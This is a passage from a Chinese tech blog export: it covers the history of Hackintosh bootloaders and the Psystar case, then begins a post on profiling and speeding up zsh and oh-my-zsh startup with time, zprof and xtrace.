x86</h2>\n<p>把 Macintosh System 7 的授权协议理解为黑苹果有些取巧了。要谈现代的黑苹果，那么一定不能无视苹果迈向 x86 的道路，所以让我们把时间再倒回去 5 年吧。</p>\n<p>1992 年 2 月 14 日，苹果开展了一项秘密计划「Star Trek」，将 Macintosh System 7（Classic Mac OS 7）连同其应用程序迁移到 Intel 架构兼容的 PC 机（采用 Intel 486 处理器）上，并要求在 12 月 1 日就拿出第一台原型机。苹果的工程师夜以继日的重构，终于赶在 Deadline 之前完成了 System 7 和 QuickTime 的移植。但是随着苹果时任 CEO John Sculley 离开公司，接任的 CEO Michael Spindler 更青睐 PowerPC 架构，Star Trek 随即被取消。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/2.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Macintosh System 7 的界面截图</p></blockquote>\n<p>虽然 Star Trek 被取消，但是仍然有部分苹果工程师努力将 Mac OS 移植到 x86 平台，其中成果最显著的是工程师 John Kullman，他在 2001 年 12 月成功将 Mac OS X 移植到了 x86 的 Quora PC 上。被称为「Mac OS X 之父」的 Bertrand Serlet（他后来成为 10.4 Tiger、10.5 Leopard 和 10.6 Snow Leopard 主要负责人）得知此事后与 John Kullman 会面，希望他将 Mac OS X 移植到一台索尼 VAIO 笔记本上。John Kullman 在当天晚餐之前就完成了任务。第二天，乔布斯就带着这台 VAIO 飞往东京，与索尼时任社长安藤国威会面，商讨有关在索尼的 VAIO 上运行 Mac OS X 的事宜，但谈判无疾而终。</p>\n<p>即使「索粉」乔布斯未能和索尼达成合作，苹果内部仍然于 2002 年进行了一项新的秘密计划「Marklar」，目的是继续维持 Mac OS X 与 x86 的兼容性。直到 2005 年 6 月 6 日，苹果在旧金山莫斯康展览中心举办了 WWDC 2005，乔布斯正式宣布他们将把个人电脑产品线 <a href=\"https://www.apple.com/newsroom/2005/06/06Apple-to-Use-Intel-Microprocessors-Beginning-in-2006/\">从 PowerPC 架构转变为 Intel 架构</a>。2006 年 1 月 10 日，苹果发布了第一台使用 Intel Core（英特尔酷睿）的 MacBook Pro，代替先前的产品线 PowerBook。12 月 28 日，苹果发布了 Mac Mini，同样搭载了 Intel Core 处理器。2007 年 4 月 5 日，苹果推出 Boot Camp（启动转换），4 月 24 日，苹果推出 17 寸的 MacBook Pro，5 月 16 日，苹果推出 12 寸的 MacBook 以代替 iBook 产品线，7 月 5 日，苹果推出 iMac 以代替 eMac 产品线，8 月 7 日，苹果推出新的高端电脑产品线 Mac Pro。2009 年 8 月，苹果推出 Mac OS X 10.6 Snow Leopard，这是第一个只支持 x86 的 Mac OS X，宣告苹果正式放弃了对 PowerPC 的支持。</p>\n<h2>黑苹果的第一道曙光</h2>\n<p>回到 WWDC 2005，苹果向开发者推出了搭载 Intel 处理器的 DTK（Dev Transition Kit），搭载了兼容 Intel 的 Mac OS X 10.4.1。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/3.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Mac OS X 10.4.1 Tiger 开发版运行在搭载了 Intel 处理器的 DTK 上。</p></blockquote>\n<p>很快，就有人尝试在非苹果硬件上运行开发版的 Mac OS X，但是该系统拒绝在普通的 PC 上运行：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/4.png\" width=\"724\" height=\"400\" class=\"lazy post-img\"></p>\n<blockquote><p>当试图在非 Mac 平台上安装开发版的 Mac OS X Tiger 10.4.1 时会看到上图的提示信息：Darwin/x86 不支持你的硬件配置。</p></blockquote>\n<p>当时，将 Mac OS X Tiger 10.4.1 运行在普通的 PC 上有三大障碍：第一是指令集，DTK 内置的 <a href=\"https://ark.intel.com/content/www/cn/zh/ark/products/27484/intel-pentium-4-processor-660-supporting-ht-technology-2m-cache-3-60-ghz-800-mhz-fsb.html\">Intel Pentium 4 660 CPU</a> 支持 SSE-3 指令集，但是 2004 年前后的 PC 常见的处理器都不包括该指令集；其次是芯片组，Mac OS X 开发版只支持 Intel 915G/ICH6 芯片组；最后，当时的苹果的 DTK 使用了 Infineon TPM 安全芯片。讽刺的是，最难克服的障碍其实不是硬件或安全芯片，而是指令集。</p>\n<p>目前可考的第一台成功的黑苹果诞生于 2005 年 8 月 10 日，那一天 <a href=\"https://web.archive.org/web/20051018182314/http://hardmac.com/news/2005-08-10/\">HardMac 网站收到匿名开发者发来的两段视频</a>，视频中展示了 Mac OS X 10.4.1 Tiger 运行在搭载 Pentium M 735 处理器的 Mitac 8050D 笔记本上。</p>\n<blockquote><p>值得一提的是，2006 年 1 月 10 日苹果发布 MacBook Pro，相比传统 x86 主板使用 BIOS 引导（Legacy），MacBook Pro 使用了 UEFI 引导方式。</p></blockquote>\n<p>2006 年 2 月 14 日，「The Guru」团队的成员 Maxxuss（crg92）发布了首个 Patch 补丁。通过该补丁修补 XNU 内核即可解除引导和安装限制、在任何内置 SSE-2 指令集的 Intel 处理器上运行 Mac OS X 10.4.4，今天 <a href=\"https://www.insanelymac.com/forum/topic/9071-1044-security-broken/?page=1\">在 InsanelyMac 上仍然可以找到当时的帖子</a>。几小时之后苹果发布了 10.4.5 版本的 Mac OS X，又过了两周 crg92 就放出了新的针对 10.4.5 的补丁。</p>\n<p>苹果随后的几个月内发布了 Mac OS X 10.4.6 和 10.4.7，OSx86 社区成员设法将这些系统中的新版本的内核替换为 10.4.4 和 10.4.5 的旧内核、实现将这些新版本的系统安装在 PC 上。但是从 10.4.8 开始，苹果开始更广泛地使用 SSE-3 指令集，意味仅仅通过修补 XNU 内核已经无法再兼容只支持 SSE-2 指令集的处理器（如早期的奔腾 4）。来自新西兰的 macOS、iOS 开发者与逆向工程师 <a href=\"http://mifki.com/\">Mfiki</a>（Vitaly Pronkin）于 2006 年 12 月 24 日放出了一个新的更精简的 Patch 以使 XNU 内核兼容 SSE2；而开发者 Semthex 则制作了一个通过 SSE-2 模拟 SSE-3 的指令集模拟器。 </p>\n<p>Mac OS X 10.5 Leopard 于 2007 年正式发布，随后 BrazilMac 发布了一个通用补丁。用户可以通过购买 Mac OS X 零售版的安装光盘、打上补丁即可让 XNU 内核运行在普通 Intel PC 上。之后，数个黑客和开发者（如 Lorem、SynthetiX、ToH、StageXNU 团队）都纷纷释出了内核补丁。同时，基于这些补丁制作的 Mac OS X「发行版」开始出现，如 iATKOS、<a href=\"https://www.insanelymac.com/forum/topic/77069-kalyway-1051-dvd-release-the-official/\">KALYWAY</a> 和 <a href=\"http://ipcosx86.wikidot.com/\">iPC</a>。</p>\n<blockquote><p>之后随着 EFI 引导方法的流行，这些发行版都逐渐改为在系统中内置 Boot-132 或 Chameleon。</p></blockquote>\n<h2>中场休息：对美国法院的一瞥</h2>\n<p>2008 年 4 月，一家名为 Psystar 的公司在美国佛罗里达州注册。这家公司计划公开销售 Intel PC，预装内置 BrazilMac 补丁的 Mac OS X 10.5 Leopard。这种 PC 一开始被称为「OpenMac」，很快又被更名为「Open Computers」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/6.jpg\" width=\"450\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>Pystar 的「OpenMac」</p></blockquote>\n<p>2008 年 7 月 3 日，苹果在加利福尼亚州地区法院起诉 Pystar 公司，声称 Pystar 公司侵犯了苹果的版权、违反了数字千年版权法案（DMCA），「避开、绕过、移除、解扰、解密、停用、破坏苹果保护机制」。</p>\n<p>2008 年 8 月 28 日，Pystar 公司在佛罗里达州地区法院起诉苹果，声称苹果公司存在垄断和其它不正当竞争行为。2008 年 11 月 18 日，Pystar 公司的起诉被驳回。</p>\n<p>2009 年 2 月 5 日，<a href=\"http://www.computerworld.com/s/article/9127579/Mac_clone_maker_wins_legal_round_against_Apple\">Pystar 公司赢得苹果第一轮的版权诉讼</a>。<strong>这一判例意味着苹果的 EULA 中的「禁止在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统」条款可能是没有法律效力的</strong>。</p>\n<p>2009 年 4 月，苹果的新闻发言人表示 Pystar 公司没有依法公开任何财务信息（利润、资产、负债）。Pystar 的 CEO 兼创始人对此拒绝置评，并仍然拒绝透露任何财务信息。</p>\n<p>2009 年 5 月 26 日，Pystar 公司申请破产保护，试图通过破产保护法案拖延苹果的诉讼。在申请破产期间，Pystar 公司仍然在销售预装 Mac OS X 的 PC，因此 2009 年 6 月法院解除了苹果的诉讼中止，使苹果可以继续起诉 Pystar 公司。2009 年 8 月 12 日，Pystar 公司的破产保护申请被佛罗里达地区法院驳回。</p>\n<p>2009 年 11 月 13 日，加利福尼亚州地方法院判定 Pystar 违反了 DMCA 和侵犯了苹果的版权，定于 12 月 14 日举行听证会。2009 年 12 月 15 日，加利福尼亚州法院发表永久性禁令，禁止 Pystar 制造、分发、协助任何人安装任何版本（包括未来版本）的 Mac OS X。2010 年 1 月 16 日，Pystar 公司提起上诉。2012 年 5 月 14 日，最高法院驳回了 Pystar 公司的上诉，苹果赢得了最终的诉讼。</p>\n<h2>向 Chameleon（变色龙）进发</h2>\n<p>回到 WWDC 2005 上发布的搭载 Intel DTK，内置了一个名为 Boot-132 的 UEFI Bootloader 用于加载 XNU 内核。。当时 Intel 的 UEFI 还是新鲜产物、几乎所有的 PC 都在使用 BIOS 引导（也就是现在被称为 Legacy BIOS 的引导方法）。Boot-132 后来随 Mac OS X 10.4.8 的 XNU 内核一起开源，所以在 2007 年，David Elliott 基于 Linux 的 GRUB Bootloader 和苹果 Boot-132 的源码开发了一个初级的 Bootloader，能够为使用 Legacy BIOS 引导的 PC 提供一个「模拟 UEFI」环境用于加载 XNU 内核。</p>\n<blockquote><p>除了 Boot-dfe，David Elliott 的作品还包括初版的 <a href=\"http://tgwbd.org/darwin/extensions.html#NullCPUPowerManagement\">NullCPUPowerManagement</a>，用于兼容苹果的电源管理 AppleIntelCPUPowerManagement。</p></blockquote>\n<p>2008 年，Voodoo 团队（原 StageXNU 团队，你应该记得在上个章节中看到过这个名字）将 David Elliott 开发的「模拟 UEFI」实现与苹果原始的 Boot-132 结合，制作了 Chameleon（变色龙）项目。随着 Chameleon 的不断迭代更新，许多功能如注入 Device Properties（设备属性）、加载 Kernel Extension（内核扩展，即 kext）、修补 ACPI、模拟 SMBIOS 机型、图形化界面的启动菜单都一一被支持。Voodoo 团队还开发了数个 kext 如 VoodooPower、VoodooSDHCI 以及在 Hackintosher 中耳熟能详的 VoodooHDA 和 VoodooPS2Controller。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/5.png\" width=\"419\" height=\"330\" class=\"lazy post-img\"></p>\n<blockquote><p>在 QEMU 虚拟机中通过 Chameleon 2.1.0 引导 PureDarwin，该版本的变色龙已经支持图形化引导界面。</p></blockquote>\n<p>由于变色龙的出现，越来越少的人选择反编译修改 XNU 内核、而是通过 Bootloader 替换 DSDT、注入设备属性和 kext。<strong>考虑到数字千年版权法（DMCA）禁止修改并分发 macOS 中非开源部分的操作系统代码，使用 Bootloader 引导黑苹果无需直接修改操作系统或 XNU 内核本身、因而成功绕过了这一法律。</strong></p>\n<p>2009 年，Mac OS X 10.6 Snow Leopard 正式发布，这是第一个完全放弃 PowerPC 架构的 Mac OS X 版本。来自俄罗斯的 <a href=\"http://netkas.org/\">Netkas</a> 率先释出了一个修改版的变色龙 EFI 可以用于引导 Mac OS X 10.6。紧接着，Voodoo 团队也释出了兼容 10.6 的官方版本更新。</p>\n<blockquote><p>除了率先使变色龙兼容 Mac OS X 10.6，Netkas 还开发了 FakeSMC 和 HWSensor。现在 Netkas 致力于拓展 AMD 显卡的兼容性（如在 macOS 10.14 Mojave 为 Raedon RX560 启用 Metal 支持、避免 Raedon W5700 在 macOS 10.15.5 上引发 Kernel Panic 等）。</p></blockquote>\n<p>2011 年，Mac OS X 10.7 Lion 发布。这是苹果第一个不再提供安装光盘的 Mac OS X 版本，也是第一个支持 SSD TRIM 的 Mac OS X 版本。来自俄罗斯的 Michael Belyaev（usr-sse2）率先找到了安装方法，将修改版安装镜像写入到 USB 存储设备，并通过 XPC EFI Bootloader（一个基于 DUET 的模拟 EFI 引导器）启动 XNU 内核。</p>\n<blockquote><p>usr-sse2 现在是 acidanthera 团队的活跃成员，参与了 OpenCore 和 VirtualSMC 等的开发。截至本文写就，usr-sse2 正在研究苹果的 IO80211Family。</p></blockquote>\n<p>同年，来自 tonymacx86 的 MacMan 开发了 <a href=\"https://tonymacx86.blogspot.com/2011/04/chimera-unified-chameleon-bootloader.html\">变色龙的一个分支 Chimera</a>。tonymacx86 社区提供的工具 UniBeast（以及后来的 MultiBeast）内置了 Chimera、大大简化了黑苹果的安装。</p>\n<h2>来到 Clover（四叶草）的时代</h2>\n<p>不论是 David Elliott 的 Boot-dfe 还是变色龙，都是基于一个模拟的 EFI 环境。这意味着：</p>\n<ul>\n<li>黑苹果不能安装 BootCamp 实现 Windows 和 Mac OS X 之间切换</li>\n<li>黑苹果无法进入恢复模式，因为变色龙无法引导 Recovery HD 分区</li>\n<li>黑苹果的硬盘不能使用 GUID 分区表（GPT），因为变色龙不支持 GPT、只支持 MBR</li>\n</ul>\n<p>微软从 Windows 7 开始对 UEFI 引导提供初步支持、主流 PC 和笔记本厂商都逐渐用 EFI 代替 Legacy BIOS；同时随着大于 2TiB 的硬盘的出现，GPT 越来越流行，Hackintosher 对支持 GPT 的、真正的 UEFI Bootloader 的呼声越来越高。</p>\n<p>Clover 的历史可以回溯到 2006 年出现的一个 FreeBSD 发行版 TrueOS。TrueOS 社区的 Christoph Pfisterer 开发了一个带有图形化界面的 UEFI Bootloader「rEFIt」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/7.png\" width=\"803\" height=\"378\" class=\"lazy post-img\"></p>\n<p>2011 年 Christoph Pfisterer 中止了 rEFIt 的开发。次年，开发者 Roderick W. Smith Fork 了 rEFIt、成立了 rEFInd 项目。同年，Slice 和 OSx86 社区讨论开发一个 UEFI Bootloader：除了支持和变色龙一样模拟 EFI 环境外、还需要兼容真正的 UEFI 环境；要能正确读取 HFS+ 分区；式、能够修补 ACPI、加载 kext、加载 SMBIOS、内置 Quirk 以在 PC 上启动 macOS。社区决定这个 Bootloader 应该基于 rEFInd 开发。2012 年，OS X 10.8 Mountain Lion 正式发布，同年 Clover 发布了第一个版本：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/8.png\" width=\"622\" height=\"533\" class=\"lazy post-img\"></p>\n<p>2014 年 10 月 16 日 OS X 10.10 Yosemite 发布，次日 Voodoo 团队发布了变色龙最后一个正式版本 2.2，提供了 Yosemite 的引导支持。</p>\n<blockquote><p>正是从 OS X 10.10 Yosemite 开始，Hackintosher 开始倾向于使用苹果发布的原始 OS X 系统镜像、使用尽可能少的 kext 和 Patch，以保证黑苹果的稳定性。</p></blockquote>\n<p>2015 年 9 月 30 日，OS X 10.11 El Capitan 发布，tonymacx86 出品的黑苹果安装工具 UniBeast 将内置的 Bootloader 从变色龙的分支 Chimera 替换为 Clover，正式宣告变色龙寿终正寝。</p>\n<h2>尾声：几个时间</h2>\n<p>截至本文写就，macOS 11.0 Big Sur 已经进入 Public Beta 5，苹果已经宣布未来 Mac 将会从 Intel 切换到 ARM 架构的 Apple Silicon。不少 Hackintosher 都在担心黑苹果的未来。本文就以对几个时间点的探讨作为结尾吧。</p>\n<h3>Clover 用了多久才取代了 Chameleon（变色龙）？</h3>\n<ul>\n<li>2008 年初 Chameleon 发布了首个版本</li>\n<li>2012 年 Clover 发布了首个版本</li>\n<li>2014 年 10 月 17 日 Chameleon 发布了最后一个版本</li>\n</ul>\n<p>Clover 从发布第一个版本发布到取代 Chameleon 只用了 2 年。</p>\n<h3>苹果从 PowerPC 切换到 Intel 用了多久？</h3>\n<ul>\n<li>2005 年 6 月 6 日苹果召开 WWDC 2005，宣布苹果将从 PowerPC 切换到 Intel</li>\n<li>2006 年 1 月 10 日苹果发布了第一台使用 Intel 的 MacBook Pro</li>\n<li>2009 年 8 月 28 日苹果发布了 Mac OS X 10.6 Snow Leopard，正式停止对 PowerPC 的支持。 </li>\n</ul>\n<p>也就是说，苹果从宣布切换到 Intel 到 Mac OS X 放弃 PowerPC 支持用了 4 年。</p>\n<h3>OpenCore 什么时候会取代 Clover？</h3>\n<p>OpenCore 0.0.1 发布于 2019 年 5 月 4 日。如果 Clover 只用了两年就完成了从发布到取代变色龙，那么明年 OpenCore 就会完全取代 Clover（指 Clover 终止开发）。然而抛开历史背景讲历史就是在耍流氓，前面的章节我们看到了变色龙的诸多缺陷（模拟的 UEFI、不支持 GPT 等），被 Clover 取代是必然的。但是现在 Clover 并没有明显的弊端、而 OpenCore 也没有非常显著的优势，加之 Clover 的维护仍然非常活跃，因此在可预见的未来中 Clover 和 OpenCore 仍然会同时存在。</p>\n<h3>苹果什么时候会放弃 Intel 的 x86 架构？</h3>\n<p>这可能是 Hackintosher 们最关心的问题了。如果套用苹果从 PowerPC 切换 Intel 的时间表，那么苹果会在 WWDC 开完后第二年（也就是 2021 年）就会将所有 Mac 切换为 ARM 架构（不再发布搭载 Intel 处理器的 Mac）、而 macOS 则会在三年后（也就是 2024 年）正式放弃对 Intel 处理器的支持。</p>\n<p>但是，现在苹果的策略和 15 年前的还是存在着重大区别 —— WWDC 2005 开完以后，苹果在 2005 年下半年没有再发布任何新 Mac，主要是释出现有的 PowerPC 架构的 Mac 的性能升级（增加运行内存、硬盘扩容等），接着整个 2006 年都没有发布 PowerPC 架构的 Mac、全部产品线都切换到 Intel 架构；而 WWDC 2020 之后，苹果却还是发布了搭载 10 代 Intel 处理器的 27 寸的 iMac 2020。显然，这一次苹果在更换架构这件事上要保守许多，苹果甚至可能在到 2021 年都会发布搭载 Intel 11 代处理器的 Mac。</p>\n<p>另外，我们还可以再列一张关于 macOS 的时间表：</p>\n<ul>\n<li>OS X 10.10 Yosemite 发布于 2014 年 10 月 16 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2015 年 8 月 15 日。</li>\n<li>OS X 10.11 El Caption 发布于 2015 年 9 月 30 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2018 年 7 月 9 日。</li>\n<li>macOS 10.12 Sierra 发布于 2016 年 9 月 20 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 9 月 26 日。</li>\n<li>macOS 10.13 High Sierra 发布于 2017 年 9 月 25 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.14 Mojave 发布于 2018 年 9 月 24 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.15 Catalina 发布于 2019 年 10 月 7 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，截至本文写就仍在维护。</li>\n<li>macOS 11.0 Big Sur 于 2020 年 6 月 22 日开始内测，兼容 2013 年上半年发布的 MacBook Air，截至本文写就仍处于公测阶段。</li>\n</ul>\n<p>通过这张时间表可以发现，过去 6 年的每个 macOS 大版本都会兼容至少 7 年以前发布的设备。因此就算苹果从 2021 年开始再也不发布搭载 Intel 处理器的 Mac，macOS 可能也需要到 2025 年才会终止对 Intel 处理器的支持。</p>\n<div class=\"license\"> <div class=\"license-title\">黑苹果的历史</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/history-osx86/\">https://blog.skk.moe/post/history-osx86/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-09-02</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/history-osx86/"},{"title":"我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化","date":"2020-08-10 03:59:00","description":"\n<p>不论是在 WSL、Linux 还是 macOS 上，强大的 zsh 一直是我的不二法宝，而 oh my zsh 自然成了最趁手的瑞士军刀，我自己还编写了数个 oh my zsh 插件和主题。直到有一天我突然发现：见鬼，为什么开个 iTerm2 的 Tab 要等上好几秒钟？</p>\n<span></span><h2>zsh 启动耗时测量</h2>\n<p>首先，我们需要一个客观衡量 zsh 启动速度的标准，而使用 macOS 和众多 Linux 发行版中自带的 <code>time</code> 可以轻松计算任何命令的执行用时，包括 shell：</p>\n<pre><code class=\"hljs bash\">$ /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>        1.77 real         1.04 user         0.95 sys</code></pre>\n<p><code>time</code> 输出了 zsh 启动时 user-land 和 system 用时，而我的 zsh 启动用时将近 2 秒钟。为了获得更精确的结果，使用 for 循环连续启动 zsh 5 次：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        1.74 real         1.02 user         0.92 sys        1.69 real         1.00 user         0.90 sys        1.71 real         1.01 user         0.91 sys        1.68 real         0.99 user         0.89 sys        1.74 real         1.02 user         0.93 sys</code></pre>\n<p>为了排除 zsh 本身的性能问题，使用 zsh 的 <code>--no-rcs</code> 参数进行测试：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 20); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh --no-rcs -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys</code></pre>\n<p>不加载 <code>.zshrc</code> 时，zsh 的启动速度是如此的快，以至于 <code>time</code> 给出了 <code>0.00</code> 的结果。</p>\n<h2>Profiling</h2>\n<p>zsh 提供了专门的 profiling 模块 <code>zprof</code> 用于衡量 zsh 各个函数的执行用时。在 <code>.zshrc</code> 文件第一行添加下述命令用于加载 <code>zprof</code> 模块：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/<span class=\"hljs-built_in\">zprof</span></code></pre>\n<p>接着启动 zsh、并使用 <code>zprof</code> 命令获取各函数用时数据：</p>\n<pre><code class=\"hljs bash\">$ /bin/zsh$ <span class=\"hljs-built_in\">zprof</span>num  calls                time                       self            name----------------------------------------------------------------------------------- 1)    1         395.66   395.66   33.10%    395.59   395.59   33.09%  _zsh_nvm_auto_use 2)    1         216.22   216.22   18.09%    216.13   216.13   18.08%  nvm_die_on_prefix 3)    1         648.00   648.00   54.20%    168.85   168.85   14.12%  nvm_auto 4)    2         479.15   239.57   40.08%    160.50    80.25   13.43%  nvm 5)    1         102.30   102.30    8.56%     84.99    84.99    7.11%  nvm_ensure_version_installed 6)    2          51.21    25.60    4.28%     29.55    14.78    2.47%  compinit 7)    1         680.18   680.18   56.89%     22.17    22.17    1.85%  _zsh_nvm_load 8)    2          21.66    10.83    1.81%     21.66    10.83    1.81%  compaudit 9)    1          17.31    17.31    1.45%     17.31    17.31    1.45%  nvm_is_version_installed10)  193          17.43     0.09    1.46%     14.50     0.08    1.21%  _zsh_autosuggest_bind_widget[Redacted]</code></pre>\n<p><code>zprof</code> 模块只能获取每个 zsh 函数的用时，因此适合找出拖累 zsh 冷启动的 oh my zsh 的插件。如果要获取完整的 <code>.zshrc</code> 性能分析，应该使用 <code>xtrace</code>。在 <code>.zshrc</code> 开头添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/datetime<span class=\"hljs-built_in\">setopt</span> PROMPT_SUBSTPS4=<span class=\"hljs-string\">'+$EPOCHREALTIME %N:%i&gt; '</span>logfile=$(mktemp zsh_profile.7Pw1Ny0G)<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"Logging to <span class=\"hljs-variable\">$logfile</span>\"</span><span class=\"hljs-built_in\">exec</span> 3&gt;&amp;2 2&gt;<span class=\"hljs-variable\">$logfile</span><span class=\"hljs-built_in\">setopt</span> XTRACE</code></pre>\n<p>并在 <code>.zshrc</code> 结尾添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">unsetopt</span> XTRACE<span class=\"hljs-built_in\">exec</span> 2&gt;&amp;3 3&gt;&amp;-</code></pre>\n<p>这会在 <code>$HOME</code> 目录下生成一个文件名包含随机字符串的文件（<code>zsh_profile.123456</code> ）。一些介绍 zsh profiling 的文章会推荐使用 <a href=\"http://kcachegrind.sourceforge.net/html/Home.html\">kcachegrind</a> 这个工具可视化这个文件，但是我们只需要知道是什么拖累了 zsh 冷启动，将这个文件格式化一下即可。这里提供一个简单的脚本：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-meta\">#!/usr/bin/env zsh</span><span class=\"hljs-built_in\">typeset</span> -a lines<span class=\"hljs-built_in\">typeset</span> -i prev_time=0<span class=\"hljs-built_in\">typeset</span> prev_command<span class=\"hljs-keyword\">while</span> <span class=\"hljs-built_in\">read</span> line; <span class=\"hljs-keyword\">do</span>    <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$line</span> =~ <span class=\"hljs-string\">'^.*\\+([0-9]{10})\\.([0-9]{6})[0-9]* (.+)'</span> ]]; <span class=\"hljs-keyword\">then</span>        <span class=\"hljs-built_in\">integer</span> this_time=<span class=\"hljs-variable\">$match</span>[1]<span class=\"hljs-variable\">$match</span>[2]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$prev_time</span> -gt 0 ]]; <span class=\"hljs-keyword\">then</span>            time_difference=$(( <span class=\"hljs-variable\">$this_time</span> - <span class=\"hljs-variable\">$prev_time</span> ))            lines+=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$time_difference</span> <span class=\"hljs-variable\">$prev_command</span>\"</span>        <span class=\"hljs-keyword\">fi</span>        prev_time=<span class=\"hljs-variable\">$this_time</span>        <span class=\"hljs-built_in\">local</span> this_command=<span class=\"hljs-variable\">$match</span>[3]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">${#this_command}</span> -le 80 ]]; <span class=\"hljs-keyword\">then</span>            prev_command=<span class=\"hljs-variable\">$this_command</span>        <span class=\"hljs-keyword\">else</span>            prev_command=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${this_command:0:77}</span>...\"</span>        <span class=\"hljs-keyword\">fi</span>    <span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">done</span> &lt; <span class=\"hljs-variable\">${1:-/dev/stdin}</span><span class=\"hljs-built_in\">print</span> -l <span class=\"hljs-variable\">${(@On)lines}</span></code></pre>\n<p>将上述内容保存在 <code>$HOME</code> 目录下 <code>format_profile.zsh</code> 文件中，然后在终端中执行：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">cd</span> <span class=\"hljs-variable\">$HOME</span>$ chmod +x format_profile.zsh$ ./format_profile.zsh zsh_profile.123456 | head -n 30356910 _zsh_nvm_auto_use:14&gt; [[ none != N/A ]]307791 /Users/sukka/.zshrc:312&gt; hexo <span class=\"hljs-string\">'--completion=zsh'</span>178444 /Users/sukka/.zshrc:310&gt; thefuck --<span class=\"hljs-built_in\">alias</span>161193 nvm_version:21&gt; VERSION=N/A148555 nvm_version:21&gt; VERSION=N/A96497 (<span class=\"hljs-built_in\">eval</span>):4&gt; pyenv <span class=\"hljs-built_in\">rehash</span>58759 /Users/sukka/.zshrc:311&gt; pyenv init -48629 nvm_auto:15&gt; VERSION=<span class=\"hljs-string\">''</span>42779 /Users/sukka/.zshrc:114&gt; FPATH=/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions:/usr/<span class=\"hljs-built_in\">local</span>...42527 nvm_auto:15&gt; nvm_resolve_local_alias default41620 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>35577 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>29444 _zsh_nvm_load:6&gt; <span class=\"hljs-built_in\">source</span> /Users/sukka/.nvm/nvm.sh24967 compaudit:154&gt; _i_wfiles=( )24889 nvm_resolve_alias:15&gt; ALIAS_TEMP=<span class=\"hljs-string\">''</span>22000 nvm_auto:18&gt; nvm_rc_version20890 nvm_ls:29&gt; PATTERN=default[Redacted]</code></pre>\n<p>这样就一目了然了。可以看到，除了 <code>nvm</code> 以外、<code>hexo</code> 的自动补全、<code>thefuck</code> 的初始化、<code>pyenv</code> 都大幅拖慢了 zsh 的启动速度。</p>\n<h2>Lazyload</h2>\n<p>你可能听过 <a href=\"https://blog.skk.moe/post/img-lazyload-hexo/\">网页的图片可以 lazyload</a>、<a href=\"https://blog.skk.moe/post/prevent-disqus-from-slowing-your-site/\">Disqus 评论系统可以 lazyload</a>，但是 <code>.zshrc</code> 一样也有 lazyload。lazyload 的特点是启动时快，首次使用时慢，因此很适合用于优化不常用而且初始化非常耗时的功能。</p>\n<p>lazyload 